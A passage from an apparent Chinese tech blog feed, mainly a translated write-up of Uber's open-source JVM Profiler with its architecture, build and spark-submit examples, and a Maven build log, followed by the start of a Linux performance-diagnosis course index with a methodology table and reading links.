<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node-jq@1.2.0</span><br><span class="line">uuid@3.2.1</span><br></pre></td></tr></table></figure>
<h4 id="schedule"><a href="#schedule" class="headerlink" title="schedule"></a>schedule</h4><ul>
<li><a href="https://www.maketecheasier.com/schedule-commands-linux-with-at/">How to Schedule Commands in Linux with the “at” Utility</a></li>
</ul>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://remysharp.com/2018/08/23/cli-improved">cli-improved</a></li>
<li><a href="https://www.fossmint.com/linux-terminal-console-games/">10 Best Linux Terminal Console Games</a></li>
<li><a href="https://www.maketecheasier.com/schedule-commands-linux-with-at/">How to Schedule Commands in Linux with the “at” Utility</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断:JVM</title>
    <url>/2018/08/07/Linux-Perf-JVM/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Uber 开源 Java 分布式应用追踪工具：JVM Profiler</li>
</ul>
<span id="more"></span>
<h1 id="Uber-开源-Java-分布式应用追踪工具：JVM-Profiler"><a href="#Uber-开源-Java-分布式应用追踪工具：JVM-Profiler" class="headerlink" title="Uber 开源 Java 分布式应用追踪工具：JVM Profiler"></a>Uber 开源 Java 分布式应用追踪工具：JVM Profiler</h1><ul>
<li><a href="https://eng.uber.com/jvm-profiler">《JVM Profiler: An Open Source Tool for Tracing Distributed JVM Applications at Scale 》</a></li>
</ul>
<p>Apache Spark 计算框架已经被广泛用来构建大规模数据应用。对 Uber 而言, 数据是战略决策和产品开发的核心。为了更好地利用这些数据, Uber 需要管理遍布全球的 Spark 实例。 Spark 使得数据技术更易于访问, 如果要做到对 Spark 应用程序的进行合理的资源分配, 优化数据基础架构的操作效率, 就需要对这些系统有更细粒度的洞察力, 即识别其资源使用模式。为了在不改变用户代码的情况下也能达成上述目标, Uber Engineering 团队构建并开源了  JVM Profiler —— 一个分布式探查器，用于收集性能和资源使用率指标为进一步分析提供服务。尽管它是为 Spark 应用而构建的, 但它的通用实现使其适用于任何基于 Java 虚拟机 ( Java virtual machine ，JVM) 的服务或应用程序。</p>
<h2 id="Profiling-challenges"><a href="#Profiling-challenges" class="headerlink" title="Profiling challenges"></a>Profiling challenges</h2><p>Uber Engineering 每天的常规工作是支持数以万计的应用程序、运行在成千上万的机器上。随着技术栈的增长, 我们很快意识到现有的性能分析和优化方案无法满足需要。特别是:</p>
<h4 id="目标1：应用级指标监控"><a href="#目标1：应用级指标监控" class="headerlink" title="目标1：应用级指标监控"></a>目标1：应用级指标监控</h4><ul>
<li>Correlate metrics across a large number of processes at the application level</li>
</ul>
<p>分布式环境中存在大量进程需要度量，包括在同一服务器上运行着多个 Spark 应用、多服务器上运行的 Spark 应用有大量的进程 (例如数以千计的执行者 executors ) , 如 图1 所示:</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JVM-Profile-1.png" alt=""></p>
<p>Uber 现有的工具只能做到服务器级别的度量（server-level metrics）并且不能针对单个应用做到精确测量。我们需要一个解决方案, 可以收集每个过程的度量值, 并将它们与每个应用程序的进程关联起来。此外, 我们不知道这些过程将在何时启动, 以及它们将运行多长时间。为了能够在这种环境中收集度量, 需要在每个进程中自动启动探查器。</p>
<h4 id="目标2：不侵入用户代码"><a href="#目标2：不侵入用户代码" class="headerlink" title="目标2：不侵入用户代码"></a>目标2：不侵入用户代码</h4><ul>
<li>Make metrics metrics collection non-intrusive for arbitrary user code</li>
</ul>
<p>目前，Apache Spark 和 Apache Hadoop 库不支持导出性能指标; 但是在通常情况下, 我们需要在不更改用户或框架代码的情况下收集这些指标。例如, 如果在 Hadoop 文件系统 (Hadoop Distributed File System ，HDFS) NameNode 上遇到高时延的情况, 我们希望检查每个 Spark 应用中的延迟情况, 以确保这类问题不再重复出现。由于 NameNode 客户端代码嵌入到了 Spark 库中, 因此修改其源代码以添加特定度量是很麻烦的。为了跟上持续增长数据基础架构, 我们需要能够在任何时候对任何应用程序进行测量, 而不进行代码更改。此外, 实现一个非侵入性的度量值收集过程将使我们能够在加载中动态地向 Java 方法中注入代码。</p>
<h2 id="JVM-Profiler-简介"><a href="#JVM-Profiler-简介" class="headerlink" title="JVM Profiler 简介"></a>JVM Profiler 简介</h2><p>为了解决上述两个难题, Uber Engineering 团队构建并开源了 JVM Profiler 。现有的同类开源工具, 比如 Etsy 的 <strong>statsd-jvm-profiler</strong> , 可以在单个应用程序级别收集度量, 但是不提供动态代码注入收集度量的能力。在这些工具的启发下, 我们的探查器提供了新功能, 如任意 Java 方法/参数分析。</p>
<p>JVM Profiler 由三项主要功能组成, 它使收集性能和资源使用率指标变得更容易, 然后可以将这些指标 (如 Apache Kafka) 提供给其他系统进行进一步分析:</p>
<ul>
<li>代理功能 ( java agent ) : 支持用户以分布式的方式收集各种指标 (例如如 CPU/内存利用率) ，用于 JVM 进程的堆栈跟踪。</li>
<li>高级分析功能（Advanced profiling capabilities）: 支持跟踪任意 Java 方法和用户代码中的参数, 而不进行任何实际的代码更改。此功能可用于跟踪 Spark 应用的 HDFS NameNode RPC 调用延迟, 并标识慢速方法调用。它还可以跟踪每个 Spark 应用读取或写入的 HDFS 文件路径, 用以识别热文件后进一步优化。</li>
<li>数据分析报告( Data analytics reporting ): 使用 JVM Profile 可以将指标数据推送给 Kafka topics 和 Apache Hive tables , 提高数据分析的速度和灵活性。</li>
</ul>
<h4 id="JVM-Profiler-典型用例"><a href="#JVM-Profiler-典型用例" class="headerlink" title="JVM Profiler 典型用例"></a>JVM Profiler 典型用例</h4><p>JVM Profiler 支持各种用例, 最典型的是能够检测任意 Java 代码。基于简单的配置, JVM Profiler 就可以附加到 Spark 应用中的每个执行者（executor）收集 Java 方法运行时度量。下面, 我们对其中的一些用例进行了讨论:</p>
<ul>
<li>Right-size executor : JVM Profiler 中的内存度量支持跟踪每个执行者的实际内存使用情况。借此 可以在 Spark 应用中 ”executor-memory” 设置最优参数。</li>
<li>监视 HDFS NameNode RPC 延迟: 例如在 Spark 应用中对类 org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB 的方法进行了分析并确定 NameNode 调用的延迟。Uber 每天都要监控5万多个 Spark 应用, 其中有数以亿计的这种 RPC 调用。</li>
<li>监视驱动程序丢弃的事件: 例如监视 org.apache.spark.scheduler.LiveListenerBus.onDropEvent, 跟踪 Spark 驱动程序事件队列太长、队列删除事件。</li>
<li>跟踪数据沿袭: 例如分析 Java 方法上的文件路径参数 ( org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB.getBlockLocations , org.apache.hadoop.hdfs.protocolPB.ClientNamenodeProtocolTranslatorPB.addBlock ) ,  可以跟踪哪些文件是由 Spark 应用读取和写入的。</li>
</ul>
<h4 id="JVM-Profiler-实现"><a href="#JVM-Profiler-实现" class="headerlink" title="JVM Profiler 实现"></a>JVM Profiler 实现</h4><p>JVM Profiler 具有非常简单且可扩展的设计。可以很容易地添加其他 Profiler 收集更多的指标, 也能部署自定义 reporter 向不同的系统发送数据指标。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JVM-Profile-2.png" alt=""></p>
<p>一旦启动 JVM Profiler 代码即通过代理参数加载到一个 Java 进程中。它由三个主要部分组成:</p>
<p><strong>Class File Transformer</strong><br>类文件转换器介由进程内的 Java 方法字节码监视任意用户代码并在内部度量缓冲区中保存度量。</p>
<p><strong>Metric Profilers</strong></p>
<ul>
<li>CPU/Memory Profiler: 通过 JMX 收集 CPU/内存利用率并发送给 reporter</li>
<li>Method Duration Profiler: 从度量缓冲区读取方法时延 (method duration) 并发送给 reporter</li>
<li>Method Argument Profiler: 从度量缓冲区读取方法参数值（method argument ）并发送给 reporter</li>
</ul>
<p><strong>Reporters</strong></p>
<ul>
<li>Console Reporter: 控制台输出</li>
<li>Kafka Reporter: 发送到 Kafka topics</li>
</ul>
<h4 id="JVM-Profiler-扩展"><a href="#JVM-Profiler-扩展" class="headerlink" title="JVM Profiler 扩展"></a>JVM Profiler 扩展</h4><p>通过 <strong>-javaagent</strong> 选项可以构建自己的 reporter , 例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -javaagent:jvm-profiler-<span class="number">0.0</span><span class="number">.5</span>.jar=reporter=com.uber.profiling.reporters.CustomReporter</span><br></pre></td></tr></table></figure>
<h4 id="数据基础设施整合"><a href="#数据基础设施整合" class="headerlink" title="数据基础设施整合"></a>数据基础设施整合</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/JVM-Profile-3.png" alt=""></p>
<p>Uber 将 JVM Profiler 与自己的数据基础设施进行整合：</p>
<ul>
<li><strong>Cluster-wide data analysis</strong>: 集群数据分析中指标数据首先推送到 Kafka 并存储于 HDFS, 用户最终通过 Hive/Presto/Spark 查询。</li>
<li><strong>Real-time Spark application debugging</strong>:  Uber 使用 Flink 实现单个应用的实时数据聚合并写入到 MySQL 数据库，这样用户就可以通过基于 Web 的接口查询指标。</li>
</ul>
<h2 id="JVM-Profiler-应用"><a href="#JVM-Profiler-应用" class="headerlink" title="JVM Profiler 应用"></a>JVM Profiler 应用</h2><p>示例：使用 JVM Profiler 跟踪一个简单的 Java 应用</p>
<p>首先，git clone 项目代码<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/uber-common/jvm-profiler.git</span></span><br></pre></td></tr></table></figure></p>
<p>然后，mvn package 构建 jvm-profiler jar<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure></p>
<p>最后，调用 JAR 运行 JVM Profiler (e.g.target/jvm-profiler-0.0.5.jar)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -javaagent:target/jvm-profiler-<span class="number">0.0</span><span class="number">.5</span>.jar=reporter=com.uber.profiling.reporters.ConsoleOutputReporter -cp target/jvm-profiler-<span class="number">0.0</span><span class="number">.5</span>.jar com.uber.profiling.examples.HelloWorldApplication</span><br></pre></td></tr></table></figure></p>
<p>上述命令行将运行一个简单的 Java 应用并通过控制台输出性能和资源使用情况。例如：</p>
<p><strong>Nill</strong></p>
<p>JVM Profiler 也能通过命令行将指标数据发送到 Kafka topic :</p>
<p><strong>Nill</strong></p>
<h4 id="Use-the-profiler-to-profile-the-Spark-application"><a href="#Use-the-profiler-to-profile-the-Spark-application" class="headerlink" title="Use the profiler to profile the Spark application"></a>Use the profiler to profile the Spark application</h4><p>示例：基于 JVM Profiler 跟踪 Spark 应用</p>
<p>假定我们已经有一个 HDFS 集群，将 JVM Profiler JAR 上传到 HDFS</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hdfs dfs -put target/jvm-profiler-<span class="number">0.0</span><span class="number">.5</span>.jar hdfs:<span class="comment">//hdfs_url/lib/jvm-profiler-0.0.5.jar</span></span><br></pre></td></tr></table></figure>
<p>使用 <strong>spark-submit</strong> 命令行启动 Spark 应用<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spark-submit --deploy-mode cluster --master yarn --conf spark.jars=hdfs:<span class="comment">//hdfs_url/lib/jvm-profiler-0.0.5.jar --conf spark.driver.extraJavaOptions=-javaagent:jvm-profiler-0.0.5.jar --conf spark.executor.extraJavaOptions=-javaagent:jvm-profiler-0.0.5.jar --class com.company.SparkJob spark_job.jar</span></span><br></pre></td></tr></table></figure></p>
<h4 id="指标查询"><a href="#指标查询" class="headerlink" title="指标查询"></a>指标查询</h4><p>Uber 将指标数据发送到 Kafka topic 和后台数据管线并自动存储于 Hive tables 。用户可以设置类似的管线并使用 SQL 查询指标数据。用户也可以编写自己的 reporter , 将指标发送到 SQL 数据库（如 MySQL）。Hive table 查询示例，包含每个进程的内存和 CPU 指标：</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JVM-Profile-4.png" alt=""></p>
<h2 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h2><p>Uber 将 JVM Profiler 应用到自己最大 Spark 应用 (1000 多个 executor ), 在该过程中将每个 executor 分配的内存减少了 2GB （从 7GB 降低到 5GB ）。对于整个 Spark 应用来说合计节省 2TB 内存。</p>
<p>Uber 还将 JVM Profiler 应用到了所有 Hive on Spark 应用, 并发现了一些提高内存使用效率的机会。下面的图3显示了 Uber 发现的一个结果: 大约70% 的应用程序的实际内存利用率不到已分配内存的 80% 。研究结果表明, 大多数应用程序可以分配较少的内存并将内存利用率提高 20% 。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/JVM-Profile-5.png" alt=""></p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ mvn package</span><br><span class="line">[INFO] Scanning <span class="keyword">for</span> projects...</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] -----------------------&lt; com.uber:jvm-profiler &gt;------------------------</span><br><span class="line">[INFO] Building uber-jvm-profiler <span class="number">0.0</span><span class="number">.7</span></span><br><span class="line">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class="line">[INFO] Including org.apache.kafka:kafka-clients:jar:<span class="number">0.11</span><span class="number">.0</span><span class="number">.2</span> in the shaded jar.</span><br><span class="line">[INFO] Including net.jpountz.lz4:lz4:jar:<span class="number">1.3</span><span class="number">.0</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.xerial.snappy:snappy-java:jar:<span class="number">1.1</span><span class="number">.2</span><span class="number">.6</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.slf4j:slf4j-api:jar:<span class="number">1.7</span><span class="number">.25</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.apache.commons:commons-lang3:jar:<span class="number">3.5</span> in the shaded jar.</span><br><span class="line">[INFO] Including com.fasterxml.jackson.core:jackson-core:jar:<span class="number">2.8</span><span class="number">.9</span> in the shaded jar.</span><br><span class="line">[INFO] Including com.fasterxml.jackson.core:jackson-databind:jar:<span class="number">2.8</span><span class="number">.9</span> in the shaded jar.</span><br><span class="line">[INFO] Including com.fasterxml.jackson.core:jackson-annotations:jar:<span class="number">2.8</span><span class="number">.0</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.javassist:javassist:jar:<span class="number">3.21</span><span class="number">.0</span>-GA in the shaded jar.</span><br><span class="line">[INFO] Including org.yaml:snakeyaml:jar:<span class="number">1.18</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.apache.httpcomponents:httpclient:jar:<span class="number">4.3</span><span class="number">.6</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.apache.httpcomponents:httpcore:jar:<span class="number">4.3</span><span class="number">.3</span> in the shaded jar.</span><br><span class="line">[INFO] Including commons-logging:commons-logging:jar:<span class="number">1.1</span><span class="number">.3</span> in the shaded jar.</span><br><span class="line">[INFO] Including commons-codec:commons-codec:jar:<span class="number">1.6</span> in the shaded jar.</span><br><span class="line">[INFO] Including redis.clients:jedis:jar:<span class="number">2.9</span><span class="number">.0</span> in the shaded jar.</span><br><span class="line">[INFO] Including org.apache.commons:commons-pool2:jar:<span class="number">2.4</span><span class="number">.2</span> in the shaded jar.</span><br><span class="line">[INFO] Replacing original artifact with shaded artifact.</span><br><span class="line">[INFO] Replacing /Users/yanrui/project-third/jvm-profiler/target/jvm-profiler<span class="number">-0.0</span><span class="number">.7</span>.jar with /Users/yanrui/project-third/jvm-profiler/target/jvm-profiler<span class="number">-0.0</span><span class="number">.7</span>-shaded.jar</span><br><span class="line">[INFO] Dependency-reduced POM written at: /Users/yanrui/project-third/jvm-profiler/dependency-reduced-pom.xml</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: <span class="number">03</span>:<span class="number">38</span> min</span><br><span class="line">[INFO] Finished at: <span class="number">2018</span><span class="number">-08</span><span class="number">-07</span>T09:<span class="number">50</span>:<span class="number">26</span>+<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">bash<span class="number">-3.2</span>$</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## MVN</span></span><br><span class="line">$ wget http://mirrors.hust.edu.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz</span><br><span class="line">$ tar -xvf apache-maven-3.5.4-bin.tar.gz</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;export M2_HOME=&quot;/usr/local/apache-maven-3.5.4&quot; &#x27;</span> &gt;&gt;  ~/.bash_profile</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;export PATH=$M2_HOME/bin:$PATH&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class="line">$ . ~/.bash_profile</span><br><span class="line">$ mvn -v</span><br><span class="line">Apache Maven 3.5.4</span><br></pre></td></tr></table></figure>
<h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="扩展阅读：性能诊断指南"><a href="#扩展阅读：性能诊断指南" class="headerlink" title="扩展阅读：性能诊断指南"></a>扩展阅读：性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="扩展阅读：How-Linux-Works"><a href="#扩展阅读：How-Linux-Works" class="headerlink" title="扩展阅读：How Linux Works"></a>扩展阅读：How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="扩展阅读：动态追踪技术"><a href="#扩展阅读：动态追踪技术" class="headerlink" title="扩展阅读：动态追踪技术"></a>扩展阅读：动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2></li>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-performance-tuning-practice/index.html">Java 应用性能调优实践 | IBM developerworks | 张 俊城, 郭 理勇, 和 刘 建 | 2016 年 6 月 28 日发布</a></li>
<li><a href="http://techblog.youdao.com/?p=961">用“逐步排除”的方法定位Java服务线上“系统性”故障</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjkwMjg3Mg==&amp;mid=2247484935&amp;idx=2&amp;sn=ca8b27d0c0451851d8091d9490266793&amp;source=41#wechat_redirect">动态追踪技术-应用性能瓶颈排障利器之火焰图 | 郑晓川 江凌生  京东商城技术架构 | 2016-12-01</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 性能诊断高级课程</title>
    <url>/2016/04/26/Linux-Perf-Master/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>方法论</li>
<li>性能诊断指南</li>
<li>How Linux Works</li>
<li>动态追踪技术</li>
<li>案例与实务</li>
<li>推荐书单</li>
</ul>
<span id="more"></span>
<h4 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h4><div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>信息收集</th>
<th>观测分析</th>
<th>统计分析</th>
<th>容量规划</th>
<th>调优</th>
<th>生命周期分析</th>
<th>实验分析</th>
<th>假设分析</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>街灯</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>随机变动</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>责怪他人</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
</tr>
<tr>
<td>Ad Hoc 核对清单法</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>问题陈述法</td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>科学法</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>循环诊断法</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>工具法</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>USE法</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>工作负载特征归纳</td>
<td></td>
<td>Yes</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>向下挖掘分析</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>延时分析</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>R 方法</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>时间跟踪</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>基础线统计</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>性能监控</td>
<td></td>
<td>Yes</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>排队论</td>
<td></td>
<td></td>
<td>Yes</td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>静态性能调整</td>
<td></td>
<td>Yes</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>缓存调优</td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>微基准测试</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>容量规划</td>
<td></td>
<td></td>
<td></td>
<td>Yes</td>
<td>Yes</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
